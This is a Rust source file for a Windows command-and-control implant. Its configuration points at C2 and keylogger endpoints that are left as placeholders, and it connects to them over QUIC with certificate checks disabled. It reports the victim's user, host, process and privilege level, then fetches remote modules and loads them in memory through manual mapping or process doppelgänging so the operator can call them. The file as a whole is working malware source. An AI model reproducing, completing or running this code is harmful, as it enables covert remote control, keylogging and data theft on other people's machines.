#![allow(non_snake_case)]
#![allow(non_camel_case_types)]
#![allow(non_upper_case_globals)]
#![allow(unsafe_op_in_unsafe_fn)]
#![allow(dead_code)]
#![allow(unused_variables)]
#![allow(static_mut_refs)]

use std::{collections::HashMap, ffi::c_void, fs, iter, mem::zeroed, process::exit, ptr, slice, sync::{Arc, LazyLock, OnceLock}, time::Duration};
use tokio::sync::mpsc;
use windows_sys::{
    Wdk::{Storage::FileSystem::NtQueryInformationToken, System::SystemServices::{RtlGetNtProductType, RtlGetVersion}}, Win32::{Foundation::*, Security::{GetSidSubAuthority, GetSidSubAuthorityCount, GetTokenInformation, LookupAccountSidW, PSID, SID_AND_ATTRIBUTES, SID_NAME_USE, SidTypeUnknown, TOKEN_MANDATORY_LABEL, TOKEN_USER, TokenIntegrityLevel, TokenUser}, Storage::FileSystem::{CreateFileW, FILE_ATTRIBUTE_NORMAL, GetFileSizeEx, OPEN_EXISTING, ReadFile, SetFilePointer}, System::{Diagnostics::Debug, LibraryLoader::{GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, GET_MODULE_HANDLE_EX_FLAG_PIN, GetModuleFileNameW, GetModuleHandleExW, GetModuleHandleW, GetProcAddress, LoadLibraryW}, Memory::{LPTR, LocalAlloc, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_READWRITE, VirtualAlloc, VirtualFree}, SystemInformation::{OSVERSIONINFOW, RtlGetProductInfo}, Threading::{GetCurrentProcess, GetCurrentProcessId, OpenProcessToken}}}, core::*
};

mod protocol;
pub mod http;

use std::{
    error::Error,
    net::{IpAddr, Ipv4Addr, SocketAddr},
};

use loader;

use tokio::sync::RwLock;
use quinn::{ClientConfig, Endpoint, TransportConfig, crypto::rustls::{NoInitialCipherSuite, QuicClientConfig}};
use rustls::{DigitallySignedStruct, SignatureScheme, client::danger, crypto::CryptoProvider, pki_types::{CertificateDer, ServerName, UnixTime}};

use http::{download_rsrc};

#[derive(Clone, Copy)]
struct module_proc_info {
    flags: u8,
    message_code:u16, //message code if the flags indicate its a builtin.
    address: usize,
    name_len:u32,
    name:[u16;16],
}

fn slice_to_array(name: &str) -> ([u16; 16], u32) {
    let utf16_chars: Vec<u16> = name.encode_utf16().collect();
    let len = utf16_chars.len().min(16);
    
    let mut arr: [u16; 16] = [0; 16];
    arr[..len].copy_from_slice(&utf16_chars[..len]);
    
    (arr, len as u32)
}

static mut GLOBAL_TX: Option<mpsc::Sender<OutgoingMessage>> = None;


type register = extern "system" fn(
    internal_proc_list_ptr:*const usize,
    internal_proc_list_len:*const usize,
    module_proc_list_ptr:*mut usize,
    module_proc_list_len:*mut usize
) -> i32;

type module_proc = extern "system" fn(
    flags: *mut u16,
    label:u32,
    input: *const usize,
    input_size:usize,
    out: *mut usize,
    out_size: *mut usize
) -> i32;

#[derive(Default)]
struct AppState {
    modules: HashMap<String,loader::ModuleInfo>,
    agent_key:String,

}

static mut MODULE_PROCS:[module_proc_info;2512] = [module_proc_info { flags: 0, message_code: 0, address: 0, name_len: 0, name: [0;16] };2512];

#[derive(Clone)]
pub struct OutgoingMessage {
    pub header: protocol::task_header,
    pub body: Vec<u8>,
}


type SharedState = Arc<RwLock<AppState>>;
static resource_url:&str = "http://REPLACE_ME/agt/api/resc/";
static keylogger_url:&str = "http://REPLACE_ME/agt/api/klgr/";
static c2_ip:&str = "REPLACE_ME";
static c2_port:&str = "REPLACE_ME";
static agent_key:&str = "REPLACE_ME";
static agent_id:OnceLock<u32> = OnceLock::new();

#[tokio::main(flavor = "current_thread")]
pub async fn start() {

    unsafe {
    #[cfg(debug_assertions)]
    {
        use windows_sys::Win32::System::Console::AllocConsole;

        let _ = AllocConsole();
    }
    }
    let state:SharedState = Arc::new(RwLock::new(AppState::default()));

    let mut write_state = state.write().await;
    write_state.agent_key = String::from(agent_key);
    drop(write_state);

    let server_addr = SocketAddr::new(c2_ip.parse().unwrap(),c2_port.parse().unwrap());
    
    loop {
        match connect_bot(server_addr, state.clone()).await {
            Ok(_) => {
                #[cfg(debug_assertions)]
                {
                    println!("Connection closed gracefully");
                }
            }
            Err(e) => {
                #[cfg(debug_assertions)]
                {
                    println!("Connection error: {}", e);
                }
            }
        }
        
        #[cfg(debug_assertions)]
        {
            println!("Reconnecting in 5 seconds...");
        }
        
        tokio::time::sleep(Duration::from_secs(5)).await;
    }
}

async fn connect_bot(server_addr: SocketAddr,state:Arc<RwLock<AppState>>) -> Result<(), Box<dyn Error + Send + Sync + 'static>> {
    
    let mut endpoint = Endpoint::client(SocketAddr::new(IpAddr::V4(Ipv4Addr::UNSPECIFIED), 0))?;
    endpoint.set_default_client_config(configure_client()?);

    let connection: quinn::Connection;
    match endpoint.connect_with(configure_client()?, server_addr, "localhost")
    .unwrap()
    .await {
        Ok(c) => {connection = c},
        Err(e) => {
            #[cfg(debug_assertions)]
            {
                println!("{}",e);
            }
            return Err(e.into());
        },
    };


    #[cfg(debug_assertions)]
    {
        println!("[client] connected: addr={}", connection.remote_address());
    }

    let (tx, mut rx) = mpsc::channel::<OutgoingMessage>(32);
    let (mut send, mut recv) = connection.open_bi().await.unwrap();
    let local_tx: mpsc::Sender<OutgoingMessage> = tx.clone();
    unsafe {GLOBAL_TX = Some(local_tx.clone());}

    #[cfg(debug_assertions)]
    {
        println!("[client] opened stream");
    }

    let meta: protocol::implant_meta_data = unsafe {get_meta_data(state.clone()).await};
    let body: Vec<u8> = serde_json::to_vec(&meta).unwrap();

    let header: protocol::task_header = protocol::task_header::new(protocol::MESSAGE_CODE::METADATA_COLLECT, 16,0,0,0, body.len() as u32);

    local_tx.send(OutgoingMessage { header, body: body }).await.unwrap();

    #[cfg(debug_assertions)]
    {
        println!("[client] sent meta data");
    }

    let recv_task = tokio::spawn(async move {
        loop {
            let mut header_buf:Vec<u8> = vec![0; size_of::<protocol::task_header>()];
            match recv.read_exact(&mut header_buf).await {
                Ok(v) => {},
                Err(e) => {
                    #[cfg(debug_assertions)]
                    {
                        println!("{}",e);
                    }
                    break;
                },
            }

            let header = protocol::task_header::from_raw(&header_buf);
            let mut body:Vec<u8> = vec![0; header.length as usize];
            match recv.read_exact(&mut body).await {
                Ok(v) => {},
                    Err(e) => {
                    #[cfg(debug_assertions)]
                    {
                        println!("{}",e);
                    }
                    break;
                },
            }

            match header.Message_code {
                protocol::MESSAGE_CODE::METADATA_UPDATE => {
                    //for now just a u32 indicating the agent id.
                    let _ = agent_id.set(u32::from_le_bytes(body[..4].try_into().unwrap()));
                    let header = protocol::task_header::new(header.Message_code, 0,header.session_id, header.label,0, 0 as u32);
                    #[cfg(debug_assertions)]
                    {
                        println!("set agent id as: {}",agent_id.get().unwrap());
                    }
                    
                    local_tx.send(OutgoingMessage { header, body: Vec::new() }).await.unwrap();
                },
                protocol::MESSAGE_CODE::MODULE_LIST => {
                    local_tx.send(module_list(header,state.clone()).await).await.unwrap();
                },
                protocol::MESSAGE_CODE::MODULE_LOAD  => {
                    match serde_json::from_slice(&body) {
                        Ok(module_load_req) => {
                            local_tx.send(module_load(header,module_load_req,state.clone()).await).await.unwrap();
                        },
                        Err(e) => {
                            #[cfg(debug_assertions)]
                            {
                                println!("{}",e);
                            }
                            continue
                        },
                    };
                },
                protocol::MESSAGE_CODE::MODULE_UNLOAD => {
                    match serde_json::from_slice(&body) {
                        Ok(module_unload_req) => {
                            local_tx.send(module_unload(header,module_unload_req,state.clone()).await).await.unwrap()
                        },
                        Err(e) => {
                            #[cfg(debug_assertions)]
                            {
                                println!("{}",e);
                            }
                            continue
                        }
                    };
                },
                protocol::MESSAGE_CODE::MODULE_COMMAND => {
                    match serde_json::from_slice(&body) {
                        Ok(module_command_req) => {
                            local_tx.send(module_command(header,module_command_req,state.clone()).await).await.unwrap();
                        },
                        Err(e) => {
                            #[cfg(debug_assertions)]
                            {
                                println!("{}",e);
                            }
                            continue
                        }
                    };
                },
                _ => {
                    if header.Message_code as usize <= 2512 {
                    let tmp_proc:module_proc =  unsafe {std::mem::transmute(MODULE_PROCS[header.Message_code as usize].address)};
                    if tmp_proc as usize == 0 {
                        #[cfg(debug_assertions)]
                        {
                            println!("invalid message code or module is not loaded: {:x}",header.Message_code as usize);
                        }
                        continue;
                    }
                    let mut out: usize = 0;
                    let mut out_size:usize = 0;
                    let mut flags:u16 = header.flags;
                    let status = tmp_proc(&mut flags,header.label,body.as_ptr() as *const _, body.len() ,&mut out,&mut out_size);

                    if out_size > 0 && out != 0 {
                        let s: &[u8] = unsafe {slice::from_raw_parts(out as *const _, out_size)};
                        let output_vec = s.to_vec();

                        let header = protocol::task_header::new(header.Message_code, flags,header.session_id, header.label, status as u32,out_size as u32);
                        local_tx.send(OutgoingMessage { header, body: output_vec }).await.unwrap();
                    } else {

                        let header = protocol::task_header::new(header.Message_code, flags,header.session_id, header.label, status as u32, 0);
                        local_tx.send(OutgoingMessage { header, body: Vec::new() }).await.unwrap();
                    }
                    unsafe { VirtualFree(out as *mut _,0, MEM_RELEASE) };
                    } else {
                        #[cfg(debug_assertions)]
                        {
                            println!("message code out of bounds: {:x}",header.Message_code as usize);
                        }
                    }
                }
            }
            
        }
    });

    let send_task = tokio::spawn(async move {
        while let Some(msg) = rx.recv().await {
            let raw_header = protocol::task_header::to_raw(msg.header);

            if let Err(e) = send.write_all(&raw_header).await {
                #[cfg(debug_assertions)] 
                {
                    println!("{}",e);
                }
                break;
            }
            if !msg.body.is_empty() {
                if let Err(e) = send.write_all(&msg.body).await {
                    #[cfg(debug_assertions)] 
                    {
                        println!("{}",e);
                    }
                    break;
                }
            }
        }
    });

    // Wait for either task to complete, then abort the other
    tokio::select! {
        _ = recv_task => {
            #[cfg(debug_assertions)]
            {
                println!("recv_task exited");
            }
        }
        _ = send_task => {
            #[cfg(debug_assertions)]
            {
                println!("send_task exited");
            }
        }
    }
    
    drop(connection);
    Ok(())
}


fn PCWSTR_to_string(p:*const u16) -> String {
    unsafe {
        if !p.is_null() {
            let mut len = 0;
            let mut ptr = p;
            while *ptr != 0 {
                len += 1;
                ptr = ptr.add(1);
            }
            return String::from_utf16(slice::from_raw_parts(p, len)).unwrap_or_default();
        }
    }
    String::new()
}

#[unsafe(no_mangle)]
pub unsafe extern "system" fn get_agent_id() -> u32 {
    let id:u32 = *agent_id.get().unwrap();
    id
}


async fn module_list(header:protocol::task_header,state:Arc<RwLock<AppState>>) -> OutgoingMessage {
    let read_state = state.read().await;
    let resp = protocol::MODULE_LIST_RESPONSE{modules:read_state.modules.keys().cloned().collect::<Vec<String>>()};
    drop(read_state);

    let body = serde_json::to_vec(&resp).unwrap();
    let header = protocol::task_header::new(header.Message_code, 16,header.session_id, header.label,0, body.len() as u32);
    OutgoingMessage { header, body }
}

async fn module_load(header:protocol::task_header,module_load_req:protocol::MODULE_LOAD_REQ,state:Arc<RwLock<AppState>>) -> OutgoingMessage {
    #[cfg(debug_assertions)]
    eprintln!("[DEBUG] module_load: starting for module '{}'", module_load_req.module_name);

    let read_state = state.read().await;
    let module_loaded = read_state.modules.contains_key(&module_load_req.module_name);
    drop(read_state);
    
    #[cfg(debug_assertions)]
    eprintln!("[DEBUG] module_load: module_loaded check = {}", module_loaded);

    if module_loaded {
        let output = protocol::OUTPUT{output: String::from("module already loaded")};
        let body = serde_json::to_vec(&output).unwrap();
        let header = protocol::task_header::new(header.Message_code, 16,header.session_id, header.label,0, body.len() as u32);
        return OutgoingMessage { header, body };
    }

    unsafe {
            let method = match module_load_req.load_method.as_str() {
                "manual_map" => loader::method::mm,
                "doppelganging" => loader::method::tx,
                _ => {
                    let output = protocol::OUTPUT{output:String::from("unknown load method")};
                    let body = serde_json::to_vec(&output).unwrap();
                    let header = protocol::task_header::new(header.Message_code, 0,header.session_id, header.label,0, body.len() as u32);
                    return OutgoingMessage { header, body:body };
                }
            };

            #[cfg(debug_assertions)]
            eprintln!("[DEBUG] module_load: load_method = '{}', method resolved", module_load_req.load_method);

            let read_state = state.read().await;
            
            drop(read_state);

            
            let resc:Vec<u16> = module_load_req.module_name.encode_utf16().chain(iter::once(0)).collect();

            let mut required_size: usize = 0;
            let result = download_rsrc(
                resc.as_ptr(),
                std::ptr::null_mut(),
                0,
                &mut required_size,
            );

            let mut buffer: Vec<u8> = vec![0; required_size];
                let mut bytes_written: usize = 0;
                
                let result = download_rsrc(
                    resc.as_ptr(),
                    buffer.as_mut_ptr(),
                    buffer.len(),
                    &mut bytes_written,
            );

            let my_module_bytes = buffer;

            #[cfg(debug_assertions)]
            eprintln!("[DEBUG] module_load: downloaded {} bytes (required_size={}, bytes_written={})", my_module_bytes.len(), required_size, bytes_written);
            
            if my_module_bytes.len() == 0 {
                let output = protocol::TASK_ERROR{message: String::from("module not found"),hex_encoded:false,..Default::default()};
                let body = serde_json::to_vec(&output).unwrap();
                let header = protocol::task_header::new(header.Message_code, 1|16,header.session_id, header.label,0, body.len() as u32);
                return OutgoingMessage { header, body };
            }

            
            #[cfg(debug_assertions)]
            eprintln!("[DEBUG] module_load: calling loader::loadlibrary with {} bytes", my_module_bytes.len());

            let decoy_module_name:String;
            let modinfo = match loader::loadlibrary(module_load_req.module_name.clone(),my_module_bytes, method) {
                Ok(modinfo) => modinfo,
                Err(err) => {
                    let output = protocol::TASK_ERROR{message:err,hex_encoded:false,..Default::default()};
                    let body = serde_json::to_vec(&output).unwrap();
                    let header = protocol::task_header::new(header.Message_code, 1|16,header.session_id, header.label,0, body.len() as u32);
                    return OutgoingMessage { header, body };
                }
            };

            #[cfg(debug_assertions)]
            eprintln!("[DEBUG] module_load: loadlibrary succeeded, handle={:x}, decoy='{}'", modinfo.Module_handle, modinfo.Decoy_module);

            //update state
            let mut write_state = state.write().await;
            decoy_module_name = modinfo.Decoy_module.clone();
            let module_handle = modinfo.Module_handle.clone();
            write_state.modules.insert(module_load_req.module_name.clone(),modinfo);
            drop(write_state);

            #[cfg(debug_assertions)]
            eprintln!("[DEBUG] module_load: state updated");

            //register internal functions
            let mut proc_list:Vec<module_proc_info> = Vec::new();
            let (p_name,p_len) = slice_to_array("download_rsrc");
            proc_list.push(module_proc_info { flags: 0, message_code: 0, address: http::download_rsrc as usize, name_len: p_len, name: p_name });
            let (p_name,p_len) = slice_to_array("get_agent_id");
            proc_list.push(module_proc_info { flags: 0, message_code: 0, address: get_agent_id as usize, name_len: p_len, name: p_name });
            let (p_name,p_len) = slice_to_array("post_log");
            proc_list.push(module_proc_info { flags: 0, message_code: 0, address: http::post_log as usize, name_len: p_len, name: p_name });
            proc_list.push(module_proc_info { flags: 0, message_code: 0, address: 0, name_len: 0, name: [0;16] });

            let tmp_mem_size:usize = size_of::<module_proc_info>()*proc_list.len();
            let tmp_mem = VirtualAlloc(std::ptr::null(), tmp_mem_size, MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
            
            #[cfg(debug_assertions)]
            eprintln!("[DEBUG] module_load: VirtualAlloc for tmp_mem = {:p}, size = {}", tmp_mem, tmp_mem_size);

            ptr::copy_nonoverlapping(proc_list.as_ptr() as *const _, tmp_mem, tmp_mem_size);

            //output from register
            let mut module_proc_list:usize = 0;
            let mut module_proc_list_len:usize = 0;

            #[cfg(debug_assertions)]
            eprintln!("[DEBUG] module_load: getting 'register' export from module handle {:x}", module_handle);

            let register_ptr = GetProcAddress(module_handle as HANDLE, s!("register"));
            
            #[cfg(debug_assertions)]
            eprintln!("[DEBUG] module_load: GetProcAddress returned {:?}", register_ptr);

            let register:register = std::mem::transmute(register_ptr.unwrap() as *const ());
            
            #[cfg(debug_assertions)]
            eprintln!("[DEBUG] module_load: calling register function...");

            register(tmp_mem as *const _,&tmp_mem_size,&mut module_proc_list,&mut module_proc_list_len);
            
            #[cfg(debug_assertions)]
            eprintln!("[DEBUG] module_load: register returned, module_proc_list={:x}, len={}", module_proc_list, module_proc_list_len);

            VirtualFree(tmp_mem,0,MEM_RELEASE);

            #[cfg(debug_assertions)]
            eprintln!("[DEBUG] module_load: parsing module_proc_list...");

            let mut offset:usize = 0;
            loop {
                let ptr = module_proc_list as *const c_void;
                let f = ptr.add(offset).cast::<module_proc_info>();

                if (*f).address == 0 || offset > module_proc_list_len {
                    #[cfg(debug_assertions)]
                    eprintln!("[DEBUG] module_load: finished parsing at offset {}", offset);
                    break;
                }

                MODULE_PROCS[(*f).message_code as usize] = (*f).clone();

                let name = String::from_utf16(slice::from_raw_parts(&(*f).name as *const _,(*f).name_len as usize)).unwrap();

                #[cfg(debug_assertions)]
                {
                    println!("flags: {:x} message code: {:x} address: {:x} name_len: {}",(*f).flags,(*f).message_code,(*f).address,name);
                }

                offset = offset + size_of::<module_proc_info>();

            }
            VirtualFree(&mut module_proc_list as *mut usize as *mut _,0,MEM_RELEASE);

            #[cfg(debug_assertions)]
            eprintln!("[DEBUG] module_load: complete for module '{}'", module_load_req.module_name);

            let output = protocol::OUTPUT{output:format!("loaded module: {}\n\ndecoy module used:{}",module_load_req.module_name,decoy_module_name)};
            let body = serde_json::to_vec(&output).unwrap();
            let header = protocol::task_header::new(header.Message_code, 0,header.session_id, header.label,0, body.len() as u32);
            OutgoingMessage { header, body:body }
    }
}

async fn module_unload(header:protocol::task_header,module_unload_req:protocol::MODULE_UNLOAD_REQ,state:Arc<RwLock<AppState>>) -> OutgoingMessage {
    let mut write_state = state.write().await;
    let msg = match write_state.modules.remove(&module_unload_req.module_name) {
        Some(moduleinfo) => {
        unsafe {
            FreeLibrary(moduleinfo.Module_handle as HANDLE);
        }

        let header = protocol::task_header::new(header.Message_code, 16,header.session_id, header.label,0, 0);
        OutgoingMessage { header, body: Vec::new() }
        },
        None => {
            let output = protocol::TASK_ERROR{message: String::from("module not loaded"),hex_encoded:false,..Default::default()};
            let body = serde_json::to_vec(&output).unwrap();
            let header = protocol::task_header::new(header.Message_code, 1|16,header.session_id, header.label,0, body.len() as u32);
        OutgoingMessage { header, body }
        },
    };
    drop(write_state);
    msg
}

async fn module_command(header:protocol::task_header, module_command_req: protocol::MODULE_COMMAND_REQ, state:Arc<RwLock<AppState>>) -> OutgoingMessage {
    let read_state = state.read().await;
    let msg = match read_state.modules.get(&module_command_req.module_name) {
        Some(module) => {
            let mut proc_name:Vec<u8> = module_command_req.function.as_bytes().to_vec();
            proc_name.push(0);

            let function_address = unsafe { GetProcAddress((*module).Module_handle as HANDLE, proc_name.as_ptr() as *const _) };
        
            if function_address.is_none() {
                let output = protocol::OUTPUT{output: String::from("function not found in module")};
                let body = serde_json::to_vec(&output).unwrap();
                let header = protocol::task_header::new(header.Message_code, 16,header.session_id, header.label,0, body.len() as u32);
                return OutgoingMessage { header, body };
            };
            
            let module_function: extern "system" fn (usize,usize,usize,usize) -> usize = unsafe { std::mem::transmute(function_address) };

            let result:usize;
            let mut out_buf_ptr:usize = 0;
            let mut out_buf_size:usize = 0;
            if module_command_req.input_options != "" {
                let mut function_input_buf:Vec<u8> = module_command_req.input_options.as_bytes().to_vec();
                result = module_function(function_input_buf.as_mut_ptr() as usize,function_input_buf.len(),&mut out_buf_ptr as *mut usize as usize,&mut out_buf_size as *mut usize as usize);

            } else {
                result = module_function(0,0,&mut out_buf_ptr as *mut usize as usize,&mut out_buf_size as *mut usize as usize);
            } 
            println!("{}",result);

            let output_string:String;
            if out_buf_ptr != 0 && out_buf_size != 0 {
                output_string = unsafe {String::from_utf16(slice::from_raw_parts(out_buf_ptr as *const u16, out_buf_size)).unwrap_or_default()};
            } else {
                output_string = String::from("");
            }

            let output = protocol::OUTPUT{output: output_string};
            let body = serde_json::to_vec(&output).unwrap();
            let header = protocol::task_header::new(header.Message_code, 16,header.session_id, header.label, 0,body.len() as u32);
            OutgoingMessage { header, body }
        },
        None => {
            let output = protocol::OUTPUT{output: String::from("module not loaded")};
            let body = serde_json::to_vec(&output).unwrap();
            let header = protocol::task_header::new(header.Message_code, 16,header.session_id, header.label, 0,body.len() as u32);
            OutgoingMessage { header, body }
        }
    };
    drop(read_state);
    msg
}

fn configure_client() -> Result<ClientConfig, NoInitialCipherSuite> {
    let crypto = rustls::ClientConfig::builder()
        .dangerous()
        .with_custom_certificate_verifier(SkipServerVerification::new())
        .with_no_client_auth();

    let mut transport = TransportConfig::default();
    transport.keep_alive_interval(Some(Duration::from_secs(10)));
    
    let mut clinet_cfg = ClientConfig::new(Arc::new(QuicClientConfig::try_from(crypto,)?));
    clinet_cfg.transport_config(Arc::new(transport));
    Ok(clinet_cfg)
}

#[derive(Debug)]
struct SkipServerVerification(Arc<CryptoProvider>);

impl SkipServerVerification {
    fn new() -> Arc<Self> {
        Arc::new(Self(Arc::new(rustls::crypto::ring::default_provider())))
    }
}

impl danger::ServerCertVerifier for SkipServerVerification {
    fn verify_server_cert(
        &self,
        _end_entity: &CertificateDer<'_>,
        _intermediates: &[CertificateDer<'_>],
        _server_name: &ServerName<'_>,
        _ocsp: &[u8],
        _now: UnixTime,
    ) -> Result<danger::ServerCertVerified, rustls::Error> {
        Ok(danger::ServerCertVerified::assertion())
    }
    fn verify_tls12_signature(
        &self,
        message: &[u8],
        cert: &CertificateDer<'_>,
        dss: &DigitallySignedStruct,
    ) -> Result<danger::HandshakeSignatureValid, rustls::Error> {
        Ok(danger::HandshakeSignatureValid::assertion())
    }

    fn verify_tls13_signature(
        &self,
        message: &[u8],
        cert: &CertificateDer<'_>,
        dss: &DigitallySignedStruct,
    ) -> Result<danger::HandshakeSignatureValid, rustls::Error> {
        Ok(danger::HandshakeSignatureValid::assertion())
    }

    fn supported_verify_schemes(&self) -> Vec<SignatureScheme> {
        self.0.signature_verification_algorithms.supported_schemes()
    }
}

async fn get_meta_data(state:Arc<RwLock<AppState>>) -> protocol::implant_meta_data {
        
        let (user,hostname) = get_user_domain().unwrap();

        let s = state.read().await;
        let mut decoded_key: [u8; 32] = [0u8; 32];
        let t = s.agent_key.trim();
        if t.len() >= 2 {
            let max_bytes = core::cmp::min(decoded_key.len(), t.len() / 2);
            for i in 0..max_bytes {
                let hi = i * 2;
                let hex_pair = &t[hi..hi + 2];
                decoded_key[i] = u8::from_str_radix(hex_pair, 16).unwrap_or(0);
            }
        }

        protocol::implant_meta_data {
            id: 0,
            key: decoded_key,
            username: user,
            hostname: hostname,
            image_path: get_this_module_path(),
            pid: get_process_id(),
            arch: get_arch(),
            platform: get_platform(),
            os_description: os_release(),
            integrity:get_integrity_level()
        }
}

pub fn get_process_id() -> u32 {
    unsafe {
        GetCurrentProcessId()
    }
}

pub fn get_arch() -> protocol::arch {
        let arch: protocol::arch = match std::env::consts::ARCH {
            "x86" => protocol::arch::x86,
            "x86_64" => protocol::arch::x64,
            "arm" => protocol::arch::arm,
            "aarch64" => protocol::arch::arm64,
            v => panic!("unhandled arch {:#?}",v)
        };
        arch
}

pub fn get_platform() -> protocol::platform {
        let platform: protocol::platform = match std::env::consts::OS {
            "linux" => protocol::platform::linux,
            "windows" => protocol::platform::windows,
            "macos" => protocol::platform::macos,
            v => panic!("unhandled os {:#?}",v)
        };
        platform
}

pub fn get_this_module_path() -> String {
        unsafe {
        let local_addr_slash_easter_egg = "swwwheart";
        let mut module_handle:HANDLE = Default::default();
        GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS|GET_MODULE_HANDLE_EX_FLAG_PIN,local_addr_slash_easter_egg.as_ptr() as *const _ as _,&mut module_handle);
        
        let mut this_module_path_buf:Vec<u16> = Vec::with_capacity(256);
        let copied = GetModuleFileNameW(module_handle,this_module_path_buf.as_mut_ptr(),this_module_path_buf.capacity() as _);
        this_module_path_buf.set_len(copied as _);
        let this_module_path = String::from_utf16(&this_module_path_buf).unwrap();

        let mut process_module_path_buf:Vec<u16> = Vec::with_capacity(256);
        let copied = GetModuleFileNameW(GetModuleHandleW(std::ptr::null()),process_module_path_buf.as_mut_ptr(),process_module_path_buf.capacity() as _);
        process_module_path_buf.set_len(copied as _);
        let process_module_path = String::from_utf16(&process_module_path_buf).unwrap();
        
        let image_path:String;
        if process_module_path.starts_with(&this_module_path) {
            image_path = process_module_path;
        } else {
            image_path = process_module_path +" "+"("+&this_module_path+")"
        }
        image_path
    }
}

pub fn get_integrity_level() -> u32 {
        unsafe {
        let mut token:HANDLE = Default::default();
        OpenProcessToken(GetCurrentProcess(), 0x2000000, &mut token);
        
        let mut bytes_required: u32 = 0;

        NtQueryInformationToken(token,TokenIntegrityLevel,std::ptr::null_mut() ,0,&mut bytes_required);

        let mut buf:Vec<u8> = Vec::with_capacity(bytes_required as usize);

        NtQueryInformationToken(token,TokenIntegrityLevel,buf.as_mut_ptr() as _,buf.capacity() as u32,&mut bytes_required);

        let token_level = buf.as_ptr().cast::<TOKEN_MANDATORY_LABEL>();

        let integrity_level = GetSidSubAuthority((*token_level).Label.Sid, (*GetSidSubAuthorityCount((*token_level).Label.Sid)) as u32 - 1);

        CloseHandle(token);
        *integrity_level
        }
} 

pub fn os_release() -> String {
        unsafe {
        let mut os: OSVERSIONINFOW = zeroed();
        os.dwOSVersionInfoSize = std::mem::size_of::<OSVERSIONINFOW>() as u32;
        let status = RtlGetVersion(&mut os);

        let mut product_type: u32 = 0;

        RtlGetProductInfo(os.dwMajorVersion,os.dwMinorVersion,0,0,&mut product_type);

        format!("{}.{}.{}.{}", os.dwMajorVersion, os.dwMinorVersion, os.dwBuildNumber,product_type)
        }
    }


pub fn get_user_domain()  -> Result<(String,String),i32> {
        unsafe {
        let mut token:HANDLE = Default::default();
        OpenProcessToken(GetCurrentProcess(), 0x2000000, &mut token);
        
        let mut bytes_required: u32 = 0;
        GetTokenInformation(token, TokenUser, std::ptr::null_mut(), 0, &mut bytes_required);

        let buffer = LocalAlloc(LPTR, bytes_required as usize);

        GetTokenInformation(token, TokenUser, buffer as *mut _, bytes_required, &mut bytes_required);

        let header = buffer.cast::<TOKEN_USER>();
        
        let sid_string: PWSTR = Default::default();

        let advapi32_handle  = GetModuleHandleW(w!("advapi32.dll"));
        let ConvertSidToStringSidW: extern "system" fn (usize,usize) -> usize = std::mem::transmute(GetProcAddress(advapi32_handle,s!("ConvertSidToStringSidW")).unwrap() as *const ());

        ConvertSidToStringSidW((*header).User.Sid as *const _ as usize,&sid_string as *const _ as usize);
        
        CloseHandle(token);
        sid_to_string((*header).User.Sid as *const _ as _)
        }
}

fn sid_to_string(psid:PSID) -> Result<(String,String),i32> {
    unsafe {
        let mut name_len = 0;
        let mut domain_len = 0;
        let mut name_use: SID_NAME_USE = SidTypeUnknown;

        LookupAccountSidW(std::ptr::null_mut(),
        psid,
        std::ptr::null_mut(),
        &mut name_len,
        std::ptr::null_mut(),
        &mut domain_len,
        &mut name_use);

        let mut name:Vec<u16> = vec![0; name_len as usize];
        let mut domain:Vec<u16> = vec![0; domain_len as usize];

        let status = LookupAccountSidW(std::ptr::null_mut(),
        psid,
        name.as_mut_ptr(),
        &mut name_len,
        domain.as_mut_ptr(),
        &mut domain_len,
        &mut name_use);
        if status == 0 {
            return Err(status);
        }
        return Ok((String::from_utf16_lossy(&name[..name_len as usize]),String::from_utf16_lossy(&domain[..domain_len as usize])))
    }
}
